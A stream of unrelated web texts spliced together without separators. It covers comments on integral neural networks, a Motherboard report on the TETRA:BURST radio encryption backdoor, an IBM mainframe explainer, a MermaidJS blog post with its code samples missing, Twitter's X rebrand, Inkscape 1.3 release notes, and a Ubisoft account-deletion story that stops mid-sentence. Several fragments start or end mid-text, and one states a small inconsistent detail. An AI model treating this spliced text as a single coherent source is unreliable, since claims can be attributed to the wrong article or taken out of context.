Both the input and the weights are vectors of the same, fixed size.</p><p>Let's imagine that the discrete values that form these vectors happen to be samples of two different continuous univariate functions. Then we can view the dot product as an approximation to the value of integrating the multiplication of the two continuous functions.</p><p>Now instead of storing the weights of our network, we store some values from which we can reconstruct a continuous function, and then sample it where we want (in this case some trainable interpolation nodes, which are convoluted with a cubic kernel). This gives us the option to sample different-sized networks, but they are all performing (an approximation to) the same operation. After training with samples at different resolutions, you can freely pick your network size at inference time.</p><p>You can also take pretrained networks, reorder the weights to make the functions as smooth as possible, and then compress the network, by downsampling. In their experiments, the networks lose much less accuracy when being downsampled, compared to common pruning approaches.</p><p>Paper: <a href="https://openaccess.thecvf.com/content/CVPR2023/papers/Solodskikh_Integral_Neural_Networks_CVPR_2023_paper.pdf" rel="nofollow noreferrer">https://openaccess.thecvf.com/content/CVPR2023/papers/Solods...</a></p><p>Code: <a href="https://github.com/TheStageAI/TorchIntegral">https://github.com/TheStageAI/TorchIntegral</a>

My thought was: you're going to spend a TON of time fiddling with hacky systems code like CUDA, to get basically a minor 2x or 4x improvement in training time, for a type of ML algorithm that wasn't even that useful: in that era the SVM was generally considered to be superior to NNs.</p><p>So it wasn't that people thought it couldn't be done, it's that nobody saw why this would be worthwhile.

Essentially, when there are significantly more data points than features (n &gt;&gt; d), machine learning usually works fine (assuming data quality, an underlying relationship, etc.).  But, for sparse datasets where there are fewer data points than features (d &gt;&gt; n), most machine learning methods fail.  There's just not enough data to learn all the relationships.  This paper builds a knowledge graph based on relationships and other pre-existing knowledge of data features to improve model performance in this case.  It's really interesting - I hadn't realized there were ways to get better performance in this case.</span></p></div></td></tr>

Disinformation. Surveillance. CYBER is Motherboard's podcast and reporting on the dark underbelly of the internet.</p></div><p><span data-component="TextBlock"><p>A group of cybersecurity researchers has uncovered what they believe is an intentional backdoor in encrypted radios used by police, military, and critical infrastructure entities around the world. The backdoor may have existed for decades, potentially exposing a wealth of sensitive information transmitted across them, according to the researchers.</p></span><span data-component="TextBlock"><p>While the researchers frame their discovery as a backdoor, the organization responsible for maintaining the standard pushes back against that specific term, and says the standard was designed for export controls which determine the strength of encryption. The end result, however, are radios with traffic that can be decrypted using consumer hardware like an ordinary laptop in under a minute.</p></span></p></div><div><p><span data-component="TextBlock"><p>“There's no other way in which this can function than that this is an intentional backdoor,” Jos Wetzels, one of the researchers from cybersecurity firm Midnight Blue, told Motherboard in a phone call.</p></span></p><blockquote data-component="QuoteBlock"><p><em><strong>Do you know about other vulnerabilities in communications networks?

Using a non-work phone or computer, you can contact Joseph Cox securely on Signal on +44 20 8133 5190, Wickr on josephcox, or email&nbsp;joseph.cox@vice.com.</strong></em></p></blockquote><p><span data-component="TextBlock"><p>The research is the first public and in-depth analysis of the <a href="https://www.etsi.org/technologies/tetra#:~:text=Standards-,Introduction,Public%20Safety" target="_blank">TErrestrial Trunked RAdio (TETRA) standard</a> in the more than 20 years the standard has existed. Not all users of TETRA-powered radios use the specific encryption algorithim called TEA1 which is impacted by the backdoor. TEA1 is part of the TETRA standard approved for export to other countries. But the researchers also found other, multiple vulnerabilities across TETRA that could allow historical decryption of communications and deanonymization. TETRA-radio users in general include national police forces and emergency services in Europe; military organizations in Africa; and train operators in North America and critical infrastructure providers elsewhere.&nbsp;</p></span><span data-component="TextBlock"><p>Midnight Blue will be presenting their findings at the upcoming Black Hat cybersecurity conference in August. The details of the talk have been closely under wraps, with the Black Hat website simply <a href="https://www.blackhat.com/us-23/briefings/schedule/index.html#redacted-telecom-talk-31807" target="_blank">describing the briefing as a “Redacted Telecom Talk.”</a> That reason for secrecy was in large part due to the unusually long disclosure process. Wetzels told Motherboard the team has been disclosing these vulnerabilities to impacted parties so they can be fixed for more than a year and a half. That included an initial meeting with Dutch police in January 2022, a meeting with the intelligence community later that month, and then the main bulk of providing information and mitigations being distributed to stakeholders. NLnet Foundation, an organization which funds “those with ideas to fix the internet,” financed the research. </p></span></p></div><p><span data-component="TextBlock"><p>The European Telecommunications Standards Institute (ETSI), an organization that standardizes technologies across the industry, first created TETRA in 1995. Since then, TETRA has been used in products, including radios, sold by Motorola, Airbus, and more. Crucially, TETRA is not open-source. Instead, it relies on what the researchers describe in their presentation slides as “secret, proprietary cryptography,” meaning it is typically difficult for outside experts to verify how secure the standard really is.</p></span><span data-component="TextBlock"><p>The researchers said they worked around this limitation by purchasing a TETRA-powered radio from eBay. In order to then access the cryptographic component of the radio itself, Wetzels said the team found a vulnerability in an interface of the radio. From there, they achieved code execution on the main application processor; they then jumped to the signals processor, which Wetzels described as something equivalent to a wifi or 3G chip, which handles the radio’s signals. On that chip, a secure enclave held the cryptographic ciphers themselves. The team finally found vulnerabilities in that which allowed them to extract the cryptography and perform their analysis. The team then reverse-engineered how TETRA implemented its cryptography, which led to the series of vulnerabilities that <a href="http://tetraburst.com/" target="_blank">they have called TETRA:BURST</a>. “It took less time than we initially expected,” Wetzels said.</p></span></p><p><span data-component="TextBlock"><p>Most interestingly is the researchers’ findings of what they describe as the backdoor in TEA1. Ordinarily, radios using TEA1 used a key of 80-bits. But Wetzels said the team found a “secret reduction step” which dramatically lowers the amount of entropy the initial key offered. An attacker who followed this step would then be able to decrypt intercepted traffic with consumer-level hardware and a cheap software defined radio dongle.</p></span><span data-component="TextBlock"><p>“This is a trivial type of attack that fully breaks the algorithm. That means an attacker can passively decrypt everything in almost real time. And it's undetectable, if you do it passively, because you don't need to do any weird interference stuff,” Wetzels said.</p></span><span data-component="TextBlock"><p>Not all current TETRA-radio customers will use TEA1, and some may have since moved onto TETRA’s other encryption algorithms. But given TETRA’s long life span, its existence still means there may have been room for exploitation if another party was aware of this issue.</p></span><span data-component="TextBlock"><p>“There's bigger fish who likely found this much earlier,” Wetzels said, referring to other third parties who may have discovered the issue.&nbsp;</p></span><span data-component="TextBlock"><p>The researchers say they identified multiple entities that they believe may have used TEA1 products at some point. They include U.S. Africom, <a href="https://www.africom.mil/" target="_blank">a part of the U.S. military which focuses on the continent</a>. Multiple military agencies did not respond to Motherboard’s request for comment.</p></span></p><p><span data-component="TextBlock"><p>“In the interest of public safety, we do not share detailed information on our cybersecurity infrastructure,” Lenis Valens, a spokesperson for PANYNJ which manages JFK airport, said in a statement when asked if the organization used TETRA radios when contacted by Motherboard. “The agency has robust protocols in place and employs the latest technologies and best practices. Safety for our passengers and customers always comes first,” the statement said.</p></span><span data-component="TextBlock"><p>Most law enforcement agencies contacted by Motherboard did not respond to a request for comment. Swedish authorities declined to comment.</p></span><span data-component="TextBlock"><p>Several radio manufacturers directed Motherboard to ETSI for comment. Claire Boyer, press and media officer for ETSI, told Motherboard in an email that “As the authority on the ETSI TETRA technology standard, we welcome research efforts that help us further develop and strengthen the security of the standard so that it remains safe and resilient for decades to come. We will respond to the report when it has been published.”</p></span><span data-component="TextBlock"><p>Specifically on the researchers’ claims of a backdoor in TEA1, Boyer added “At this time, we would like to point out that the research findings do not relate to any backdoors. The TETRA security standards have been specified together with national security agencies and are designed for and subject to export control regulations which determine the strength of the encryption.”</p></span><span data-component="TextBlock"><p>The researchers stressed that the key reduction step they discovered is not advertised publicly.</p></span></p><p><span data-component="TextBlock"><p>“‘Intentional weakening’ without informing the public seems like the definition of a backdoor,” Wouter Bokslag from Midnight Blue told Motherboard in an email.</p></span><span data-component="TextBlock"><p>In ETSI’s statement to Motherboard, Boyer said “there have not been any known exploitations on operational networks” of the vulnerabilities the researchers disclosed.</p></span><span data-component="TextBlock"><p>Bokslag from Midnight Blue said in response that “There is no reason ETSI would be aware of exploitations in the wild, unless customers reach out to ETSI after detecting anomalies in their network traffic.” Then with the TEA1 issues specifically, “since it can be passively intercepted and decrypted, there is no detectable interference, and ETSI not knowing any concrete cases seems like a bit of a meaningless statement with this regard.”</p></span><span data-component="TextBlock"><p>In response to some of the researchers’ findings, radio manufacturers have developed firmware updates for their products. For TEA1, however, the researchers recommend users migrate to another TEA cipher or apply additional end-to-end encryption to their communications. Wetzels said that such an add-on does exist, but that hasn’t been vetted by outside experts at this time.</p></span><span data-component="TextBlock"><p>Bart Jacobs, a professor of security, privacy and identity, who did not work on the research itself but says he was briefed on it, said he hopes “this really is the end of closed, proprietary crypto, not based on open, publicly scrutinised standards.”</p></span><span data-component="TextBlock"><p><em><strong>Subscribe to our cybersecurity podcast,&nbsp;<a href="https://itunes.apple.com/gb/podcast/cyber/id1441708044?mt=2" target="_blank">CYBER</a>.

If they’re dinosaurs, they’re T-Rexes, and desktops and server computers are puny mammals to be trodden underfoot.</p>
<p>It’s estimated that there are 10,000 mainframes in use today. They’re used almost exclusively by the largest companies in the world, including two-thirds of Fortune 500 companies, 45 of the world’s top 50 banks, eight of the top 10 insurers, seven of the top 10 global retailers, and eight of the top 10 telecommunications companies. And most of those mainframes come from IBM.</p>
<p>In this explainer, we’ll look at the IBM mainframe computer—what it is, how it works, and why it’s still going strong after over 50 years.</p>
<h2>Setting the stage</h2>
<p>Mainframes descended directly from the technology of the first computers in the 1950s. Instead of being streamlined into low-cost desktop or server use, though, they evolved to handle massive data workloads, like bulk data processing and high-volume financial transactions.</p>
<p>Vacuum tubes, magnetic core memory, magnetic drum storage, tape drives, and punched cards were the foundation of the IBM 701 in 1952, the IBM 704 in 1954, and the IBM 1401 in 1959. Primitive by today’s standards, these machines provided the functions of scientific calculations and data processing that would otherwise have to be done by hand or mechanical calculators. There was a ready market for these machines, and IBM sold them as fast as it could make them.</p>
<p>In the early years of computing, IBM had many competitors, including Univac, Rand, Sperry, Amdahl, GE, RCA, NEC, Fujitsu, Hitachi, Unisys, Honeywell, Burroughs, and CDC. At the time, all of these other companies combined accounted for about 20 percent of the mainframe market, and IBM claimed the rest. Today, IBM is the only mainframe manufacturer that matters and that does any kind of business at scale. Its de facto competitors are now the cloud and clusters, but as we'll see, it's not always cost-effective to switch to those platforms, and they're not able to provide the reliability of the mainframe.</p>                                            
                                                        
<h2>Built-in redundancy</h2>
<p>By any standard, mainframes are enormous. Today’s mainframe can have up to 240 server-grade CPUs, 40TB of error-correcting RAM, and many petabytes of redundant flash-based secondary storage. They’re designed to process large amounts of critical data while maintaining a 99.999 percent uptime—that’s a bit over five minutes' worth of outage per year. A medium-sized bank may use a mainframe to run 50 or more separate financial applications and supporting processes and employ thousands of support personnel to keep things running smoothly.</p>
<p>Most mainframes process high-volume financial transactions, which include things like credit card purchases at a cash register, withdrawals from an ATM, or stock purchases on the Internet.</p>
<p>A bank’s lifeblood isn't money—it’s data. Every transaction a bank makes involves data that must be processed. A debit card transaction, for instance, involves the following data that must be processed:</p>
<ul>
<li>Retrieving a user’s debit account info</li>
<li>Validating the user ID and PIN</li>
<li>Checking the availability of funds</li>
<li>Debiting the user’s account for the transaction amount</li>
<li>Crediting the seller’s account</li>
</ul>
<p>All this must happen in seconds, and banks have to ensure they can maintain a rapid response even during high-volume events such as shopping holidays. Mainframes are designed from the ground up to provide both redundancy and high throughput for these purposes. High-speed processing is no good if processing stops during business hours, and reliable processing is no good if people have to wait minutes for a transaction to process.</p>
<p>When you process a financial transaction, it means you’re making money. If you’re processing a lot of transactions, you need to spend a lot of money on redundancy to keep things running smoothly. When parts inevitably fail, the show must go on. That’s where mainframes’ built-in redundant processing comes in.</p>

<div id="readability-page-1" class="page"><div id="__next"><article dir="ltr"><h2>The Unreasonable Effectiveness of Sequence Diagrams in MermaidJS</h2><p><img loading="lazy" width="784" height="319" decoding="async" data-nimg="1" srcset="https://jessems.com/_next/image?url=%2F_next%2Fstatic%2Fmedia%2F20230722225447.477bc2cf.png&amp;w=828&amp;q=75 1x, https://jessems.com/_next/image?url=%2F_next%2Fstatic%2Fmedia%2F20230722225447.477bc2cf.png&amp;w=1920&amp;q=75 2x" src="https://jessems.com/_next/image?url=%2F_next%2Fstatic%2Fmedia%2F20230722225447.477bc2cf.png&amp;w=1920&amp;q=75"></p>
<p>Recently I came across this article written by the founder of MermaidJS, Knut Sveidqvist:</p>
<p><a target="_blank" rel="noreferrer" href="https://www.mermaidchart.com/blog/posts/sequence-diagrams-the-good-thing-uml-brought-to-software-development">Sequence diagrams, the only good thing UML brought to software development<span> (opens in a new tab)</span></a></p>
<p>Knut argues that the UML standard has been a flop, but sequence diagrams have been somewhat of a success, because unlike most of UML, they're actually quite useful.</p>
<p>What has surprised me since — and what this article is about — is how surprisingly pleasant it is to create sequence diagrams in code with MermaidJS.</p>
<p>I'm a big fan of visualizing things. Not everyone seems to be such a proponent of this. My experience is that as soon as I'm able to offload some of the complexity of a problem to a visual representation, it frees up space. I can use that space to increase my capacity for grappling with complexity. If I cannot do this, I notice that I struggle to hold mutliple big chunks in my head at once.</p>
<p>If you've dabbled in UML, or if you've seen a sequence diagram, you might acknowledge that they're pretty useful.</p>
<p>The problem is that creating them with visual tools is a pain in the ass. I've created a handful of sequence diagrams using Lucidchart and it's a slow process and extremely brittle to any future change.</p>
<p><img loading="lazy" width="1734" height="942" decoding="async" data-nimg="1" srcset="https://jessems.com/_next/image?url=%2F_next%2Fstatic%2Fmedia%2F20230722154740.fd17f09d.png&amp;w=1920&amp;q=75 1x, https://jessems.com/_next/image?url=%2F_next%2Fstatic%2Fmedia%2F20230722154740.fd17f09d.png&amp;w=3840&amp;q=75 2x" src="https://jessems.com/_next/image?url=%2F_next%2Fstatic%2Fmedia%2F20230722154740.fd17f09d.png&amp;w=3840&amp;q=75"></p>
<p>Mermaid, on the other hand, represents a different approach. It is a Javascript diagramming library, where you declaratively define your diagram in code.</p>
<p>This input:</p>

<p>Leads to this output:</p>

<p>I'll admit, that never sounded appealing to me. I reach for visualizations because the code is overwhelming me. Reaching for code to solve my code problem seemed like something that would only appeal to someone that loves code so much that they're probably no good at visualizing.</p>
<p>But then I tried it and I loved it. It was quick, painless and beautiful. I'm honestly surprised how quick it is and how well it works.</p>
<p>Here are some tips on how I use it.</p>
<h2>Fleshing out user stories<span id="fleshing-out-user-stories"></span><a href="#fleshing-out-user-stories" aria-label="Permalink for this section"></a></h2>
<p>At my work at <a target="_blank" rel="noreferrer" href="https://bithawk.ch/">BitHawk<span> (opens in a new tab)</span></a> I use it to flesh out user stories. Typically I'll need to understand how some part of the sytem works before I come up with a solution. Both the current implementation as well as the solution may benefit from being mapped out as a sequence diagram.</p>
<p>I start with a markdown file, which may look something like this:</p>

<p>But then I could augment it with a sequence diagram to explain my implementation plan. Right inside of markdown!</p>

<p>I will first render this with a markdown parser with hot reloading.</p>
<p>The one I settled on is a Rust library called <a target="_blank" rel="noreferrer" href="https://github.com/npm/marky-markdown">Marky<span> (opens in a new tab)</span></a>, which has some nice built-in templates and comes with Mermaid support.</p>

<p>And the result looks like this:</p>
<p><img alt="Result" loading="lazy" width="2748" height="1324" decoding="async" data-nimg="1" srcset="https://jessems.com/_next/image?url=%2F_next%2Fstatic%2Fmedia%2F20230722171418.c8625d38.png&amp;w=3840&amp;q=75 1x" src="https://jessems.com/_next/image?url=%2F_next%2Fstatic%2Fmedia%2F20230722171418.c8625d38.png&amp;w=3840&amp;q=75"></p>
<p>With the default theme the diagram is somewhat small. As soon as I have some time I'll create a theme that allows for a full-width diagram, until then I've been zooming in a bit with the browser to make the diagram full screen.</p>
<p>This allows me to tweak the code and get an instant preview of the result.</p>
<h3>Linking up your sequence diagram<span id="linking-up-your-sequence-diagram"></span><a href="#linking-up-your-sequence-diagram" aria-label="Permalink for this section"></a></h3>
<p>At this point the diagram is being rendered as html elements. The main benefit I see is that this allows you to link conceptual components to their actual implementation. This is especially useful in the ServiceNow context where Scripts live within records which have their own URLs.</p>

<p>And this is how that looks:</p>
<p><img loading="lazy" width="2880" height="1634" decoding="async" data-nimg="1" srcset="https://jessems.com/_next/image?url=%2F_next%2Fstatic%2Fmedia%2F20230722172930.c3dc181a.gif&amp;w=3840&amp;q=75 1x" src="https://jessems.com/_next/image?url=%2F_next%2Fstatic%2Fmedia%2F20230722172930.c3dc181a.gif&amp;w=3840&amp;q=75"></p>
<h3>Rendering as an image<span id="rendering-as-an-image"></span><a href="#rendering-as-an-image" aria-label="Permalink for this section"></a></h3>
<p>That might be good enough for most use cases. But typically I want to copy and paste my markdown into an HTML input field on a <code dir="ltr">rm_story</code> record in ServiceNow. When I do that I want the HTML formatting as well as an image of the diagram to transfer over.</p>
<p>So long as the diagram is being rendered as HTML, this won't work. We need to render the diagram as a base64 image. That way, when we copy the text with the image, all of the image data is loaded into the clipboard.</p>
<p>Here's how we can accomplish that.</p>
<p>First we convert the mermaid diagrams in our markdown file to an image. I like going with SVG here, but the HTML field I'm targetting doesn't support that, so I'll have to settle for PNG. I use the <a target="_blank" rel="noreferrer" href="https://github.com/mermaid-js/mermaid-cli">mermaid cli library<span> (opens in a new tab)</span></a> for this.</p>

<p>Sometimes I'll scale up the PNG a bit if it looks too small.</p>

<p>And then I'll run marky again. This time without the D flag (because <code dir="ltr">mmdc</code> converted our mermaid code into image references) and with the I flag to include the images as base64 encoded blobs.</p>

<p>If we now navigate to the hot reload server, we'll be able to select the entire page, copy it and paste it into our HTML field, transferring content, styling and images.</p>
<p><img loading="lazy" width="2880" height="1634" decoding="async" data-nimg="1" srcset="https://jessems.com/_next/image?url=%2F_next%2Fstatic%2Fmedia%2F20230722175514.a1c102cb.gif&amp;w=3840&amp;q=75 1x" src="https://jessems.com/_next/image?url=%2F_next%2Fstatic%2Fmedia%2F20230722175514.a1c102cb.gif&amp;w=3840&amp;q=75"></p>
<h2>Conclusion<span id="conclusion"></span><a href="#conclusion" aria-label="Permalink for this section"></a></h2>
<p>I agree with Knut, sequence diagrams are useful and I've discovered that MermaidJS combined with some Markdown tooling is a very convenient way to use them in practice.</p></article></div></div>]]></description>

<div id="readability-page-1" class="page"><div>
				<p id="speakable-summary">Twitter has removed the iconic bird logo and adopted ‘X’ as its official logo. This move comes after Elon Musk announced the change <a href="https://techcrunch.com/2023/07/23/elon-musk-says-an-x-will-soon-mark-the-spot-where-twitter-used-to-be/">over the weekend</a>. The change is already live on the website.</p>
<p>Notably, Musk tweeted that x.com now also redirects to twitter.com. In the post, Musk also called this an “interim” logo, so we might see another logo change in the future.</p>

<p>The social network might not stop at just replacing the logo. Musk said the company will eventually “bid adieu to the Twitter brand and, gradually, all the birds.”</p>
<p>Late Sunday, Musk changed his profile picture to the new Twitter logo. Twitter’s official account @Twitter has also changed its name and display picture to the new X logo.</p>

<p>In a reply to a user, Musk also hinted that people should refer to Tweets as “X’s.”</p>

<p>The company’s CEO Linda Yaccarino tweeted that while Twitter changed the way people conversed with each other, X will go further and will have features “centered in audio, video, messaging, payment/banking” and make it a “global marketplace for ideas, goods, services, and opportunities.” That sounds like a lot of things.</p>
<div>
<blockquote data-width="550" data-dnt="true">
<p lang="en" dir="ltr">X is the future state of unlimited interactivity – centered in audio, video, messaging, payments/banking – creating a global marketplace for ideas, goods, services, and opportunities. Powered by AI, X will connect us all in ways we’re just beginning to imagine.</p>
<p>— Linda Yaccarino (@lindayacc) <a href="https://twitter.com/lindayacc/status/1683213895463215104?ref_src=twsrc%5Etfw">July 23, 2023</a></p></blockquote>
</div>
<p>Musk’s obsession with the letter ‘X’ is well known. He founded X.com back in 1997, which eventually became PayPal. His space startup SpaceX has ‘X’ as the logo. And most recently, he founded <a href="https://techcrunch.com/2023/07/12/elon-musk-wants-to-build-ai-to-understand-the-true-nature-of-the-universe/">an AI company called X.ai</a>. In April, the Musk-owned social network changed its <a href="https://techcrunch.com/2023/04/11/twitter-inc-is-now-x-corp/">legal name from Twtter Inc. to X Corp</a>.</p>
<p>After he took over Twitter, the Tesla CEO talked about <a href="https://techcrunch.com/2022/10/08/elon-musk-x-everything-wechat-tesla-app/">turning the social network into “X, the everything app” multiple times</a>.</p>
<p>This is not the first time Musk is changing the Twitter logo. Earlier this year, he <a href="https://techcrunch.com/2023/04/03/twitters-new-homepage-logo-is-very-doge-y/">briefly changed the social network’s logo to the Doge meme</a>. A developer who had made an extension to avoid the doge logo <a href="https://twitter.com/smylers2/status/1683405540297146369?s=20">said</a>&nbsp;it also works for the new “X” logo — so you can restore the bird logo quickly.</p>

<p>Twitter didn’t have its iconic bird logo during the initial years of its existence. In 2010, the company officially adopted the emblematic logo called “Larry the bird” —&nbsp;it is named after the legendary Boston Celtics basketball player Larry Bird.</p>
<p>The company’s move to change its branding comes days after Musk <a href="https://twitter.com/elonmusk/status/1680082007873953794?s=20">replied</a> to a user saying it is still in “negative cash flow” because of a “~50% drop in advertising revenue plus heavy debt load.”</p>

<p>With version 1.3 of Inkscape, you’ll find <strong>improved performance</strong>, <strong>several new features</strong>, and <strong>a solid set of improvements</strong> to a few existing ones.</p>

<p>This version is squarely focused on helping users get organized and work more efficiently with our free and open source vector-editing software.</p>

<p>In fact, our project developers, most of them volunteer contributors from around the world, have been working hard behind the scenes on the code base to improve the performance of the software. Some of the heavy rendering tasks have been separated internally, to help with performance when zooming, panning and transforming objects. By default, Inkscape will now leverage the power of all your computer's cores when it renders objects, but you can also choose to limit its powers in the preferences.</p>

<p>As always, there are a few new features in this release, which have been tested by users during the beta release.<br>
<strong>Many thanks</strong> to everyone who lent a hand with this important step in the process!</p>

<p>Among our favorites are several that focus on helping you get things organized and work more efficiently when using Inkscape.</p>

<h2>Shape Builder tool</h2>

<figure><a href="https://media.inkscape.org/media/news/uploads/shapebuilder-dolphin.gif" target="_blank"><img alt="Combining paths by click and drag to build up new paths with the Shape Builder tool" src="https://media.inkscape.org/media/news/uploads/shapebuilder-dolphin.gif"> </a>

<figcaption>Combining paths by click and drag to build up new paths with the Shape Builder tool</figcaption>
</figure>



<p>Inkscape’s new Shape Builder tool helps get the job done quickly and efficiently. You’ll enjoy the overview of all shapes and the ability to select multiple overlapping shapes – click, or click and drag them. Your objects will retain their original color, too. Shortcuts for this tool include Shift for quickly switching between adding and subtracting parts. There is one caveat for the tool at this time, as it is still pretty new.&nbsp;When you use&nbsp;it with curved shapes, you can end up with paths with&nbsp;a large number of nodes. If you don't need to be really precise, use&nbsp;Ctrl+L or the 'Simplify' LPE to simplify the result. This is on the list to be&nbsp;addressed in a future version of Inkscape.</p>

<h2>Document Resources Dialog</h2>

<figure><a href="https://media.inkscape.org/media/news/uploads/document_properties_2.gif" target="_blank"><img alt="The Document Resources dialog shows statistics about your document" src="https://media.inkscape.org/media/news/uploads/document_properties_2.gif"> </a>

<figcaption>The Document Resources dialog shows statistics about your document</figcaption>
</figure>

<p>If you like to efficiently organize your Inkscape documents, this is the tool for you. There are times when being able to quickly see an overview of elements is key – when sharing a file for commercial printing, for instance. It’s a checklist of resources contained in your document, including patterns, filters, colors, fonts, symbols, markers, and much more.</p>

<h2>Font collections</h2>

<figure><a href="https://media.inkscape.org/media/news/uploads/font_collections_opt.gif" target="_blank"><img alt="Creating a font collection and filtering by collection" src="https://media.inkscape.org/media/news/uploads/font_collections_opt.gif"> </a>

<figcaption>Creating a font collection and filtering by collection</figcaption>
</figure>

<p>Still on an organizing path, this new button helps those who wrestle with many fonts to categorize them by collections – and easily and quickly identify which font(s) to grab for which contract or client or custom project. Or you can organize them by style – cursive, funny, serif, sans-serif... There’s a new icon to help you find those collections.</p>

<h2>Patterns</h2>

<figure><a href="https://media.inkscape.org/media/news/uploads/pattern_editor1.gif" target="_blank"><img alt="Adjusting pattern parameters in the Pattern Editor" src="https://media.inkscape.org/media/news/uploads/pattern_editor1.gif"> </a>

<figcaption>Adjusting pattern parameters in the Pattern Editor</figcaption>
</figure>

<p>Not only do you have access to a funky and practical library of patterns within Inkscape, there’s a new pattern editor that enables you to adjust a pattern. In addition to being very useful, it’s also fun to explore... have fun playing with shape, size, and rotation with these repeats. Change colors for your version of a pattern and adapt the offset, too.</p>

<p>For your inner organizer, the patterns are now categorized into collections here, so they’re easier to find a second time.</p>

<p>Inkscape 1.3 has plenty to offer in terms of improvements to the features you know and love already. We’ve put together a short list of ones to check out first:</p>

<h2>Layers and Objects dialog</h2>

<figure><a href="https://media.inkscape.org/media/news/uploads/layers-panel-enhancement.gif" target="_blank"><img alt="Setting opacity and blend mode in the Layers and Objects dialog" src="https://media.inkscape.org/media/news/uploads/layers-panel-enhancement.gif"> </a>

<figcaption>Setting opacity and blend mode in the Layers and Objects dialog</figcaption>
</figure>

<p>The search box is back! Create and filter by name. The improved Objects dialog allows you to once more use the slider to adjust the opacity or blending mode of a layer, and drag multiple objects to hide or lock them in a single swipe; done. You’ll also enjoy the shortcuts for navigating and tweaking – the arrow keys, space bar and shift key all have roles.</p>

<h2>Persistent snap bar</h2>

<p>For those of you who use snapping, you’ll be able to once again quickly adjust the snap settings. For those of you who haven’t played with this feature, now’s the time to test it out.</p>

<h2>Page margins and bleed</h2>

<figure><a href="https://media.inkscape.org/media/news/uploads/page_margins.gif" target="_blank"><img alt="Setting page margins" src="https://media.inkscape.org/media/news/uploads/page_margins.gif"> </a>

<figcaption>Setting page margins</figcaption>
</figure>

<p>When you’re prepping your document for print (in RGB, of course), you now have more control over margins and bleed. You’ll spot the new round handles in the middle of the page borders. Simply click and drag them to set your margins. When it comes to the red boundary for the bleed margin, you can edit it from the tool controls bar, in a fly-out menu that allows you to customize your document.</p>

<h2>Lasso selection for nodes</h2>

<p>Being a node ranger just got easier! You’ll appreciate being able to hold the Alt key and draw to select nodes that are hard to select with rectangle selection.</p>

<figure><a href="https://media.inkscape.org/media/news/uploads/leaves-node-selection.gif" target="_blank"><img alt="Selecting nodes by drawing around them" src="https://media.inkscape.org/media/news/uploads/leaves-node-selection.gif"> </a>

<figcaption>Selecting nodes by drawing around them</figcaption>
</figure>

<h2>Live Path Effects (LPE) dialog redesign</h2>

<figure><a href="https://media.inkscape.org/media/news/uploads/layered-path-effects-5-fast.webp" target="_blank"><img alt="Redesigned LPE dialog for quick and easy access" src="https://media.inkscape.org/media/news/uploads/layered-path-effects-5-fast.webp"> </a>

<figcaption>Redesigned LPE dialog for quick and easy access</figcaption>
</figure>

<p>If you ever wanted to get a better handle on your LPE situation, this revamped dialog delivers just that. See an overview of your stack unfolded and enjoy a quicker way to add a new LPE to your work all while making it easier to see which one you’ve got selected.</p>

<h2>PDF import rewritten</h2>

<figure><a href="https://media.inkscape.org/media/news/uploads/pdf_import_dialog.png" target="_blank"><img alt="Informative and feature-rich PDF import dialog" src="https://media.inkscape.org/media/news/uploads/pdf_import_dialog.png"> </a>

<figcaption>Informative and feature-rich PDF import dialog</figcaption>
</figure>

<p>Inkscape’s PDF importer has undergone an overhaul. You’ll find a new dialog with an overview of what Inkscape will do with each font it finds in your PDF, and more.&nbsp; &nbsp;</p>

<h2>Node deletion logic changed</h2>

<figure><a href="https://media.inkscape.org/media/news/uploads/refining-artwork.gif" target="_blank"><img alt="Inkscape guessing the desired result when deleting nodes (mostly smooth results)" src="https://media.inkscape.org/media/news/uploads/refining-artwork.gif"> </a>

<figcaption>Inkscape guessing the desired result when deleting nodes (mostly smooth results)</figcaption>
</figure>

<p>Deleting nodes now doesn’t always behave the same, as Inkscape tries to detect whether you want the result to be a straight line connecting the nodes, or whether you want the result to be a round and smooth curve.</p>

<h2>Pinned colors in palette</h2>

<p>We’re working hard to help you find the colors you need to succeed. Choose and pin the most important colors from a palette and keep them at your fingertips. Then unpin the ones you don’t need. Customize the size of the color swatches, too. This is practical when you’ve got a project with a specific color palette to respect. Additionally, the new shortcut F hides all canvas overlays and anything outside the page, so you can check your results and see what’s going to be printed.</p>

<figure><a href="https://media.inkscape.org/media/news/uploads/palette_scrolling.gif" target="_blank"><img alt="Scrolling through the palette, with pinned colors on the left" src="https://media.inkscape.org/media/news/uploads/palette_scrolling.gif"> </a>

<figcaption>Scrolling through the palette, with pinned colors on the left</figcaption>
</figure>

<h2>Paste on page</h2>

<p>Now you can copy and paste an object from one page to another one and it’ll land in the same position. This is terrific when building templates and presentations or clones for animation using Inkscape.</p>

<h2>Filter editor overhaul</h2>

<figure><a href="https://media.inkscape.org/media/news/uploads/filter_resize.gif" target="_blank"><img alt="The Filters dialog automatically changes layout on resizing" src="https://media.inkscape.org/media/news/uploads/filter_resize.gif"> </a>

<figcaption>The Filters dialog automatically changes layout on resizing</figcaption>
</figure>

<p>This dialog has seen much love and is now easier to use. You’ll appreciate the pop-up menu when applying a filter to your selection and searching for certain effects, like blur.&nbsp;<br>

<p>I'm pretty sure I have a <a href="https://www.pcgamer.com/uk/tag/ubisoft/" data-auto-tag-linker="true">Ubisoft</a> account⁠—it's the sort of thing that's come up every few years when there's a Ubisoft game I want to play, and I've had to go through the company's proprietary launcher/digital marketplace, Ubisoft Connect, formerly Uplay, to access it. Leaving a Ubisoft account inactive for too long, though, apparently puts it at risk of permanent deletion.</p><p>A piracy and anti-DRM focused Twitter account, <a href="https://twitter.com/PC_enjoyer/status/1681655629276930048" target="_blank" data-url="https://twitter.com/PC_enjoyer/status/1681655629276930048">PC_enjoyer</a>, recently shared a screenshot of a Ubisoft support email telling the user that their Ubisoft account had been suspended for "inactivity," and would be "permanently closed" after 30 days. The email provided a link to cancel the move.</p><p>Now, that sounds like a phishing scam, right? I and many commenters wondered that, looking at the original post, but less than a day later, Ubisoft's verified support account <a href="https://twitter.com/UbisoftSupport/status/1682046437834784768" target="_blank" data-url="https://twitter.com/UbisoftSupport/status/1682046437834784768">responded to the tweet</a>, seemingly confirming the screenshotted email's legitimacy.&nbsp;</p><p>"You can avoid the account closure by logging into your account within the 30 days (since receiving the email pictured) and selecting the Cancel Account Closure link contained in the email," Ubisoft Support wrote. "We certainly do not want you to lose access to your games or account so if you have any difficulties logging in then please create a support case with us."</p><p>I was unable to find anything regarding account closure for inactivity in Ubisoft's <a href="https://legal.ubi.com/termsofuse/en-US" target="_blank" data-url="https://legal.ubi.com/termsofuse/en-US">US terms of use</a> or its <a href="https://legal.ubi.com/eula/en-US" target="_blank" data-url="https://legal.ubi.com/eula/en-US">end user licence agreement</a>, but the company does 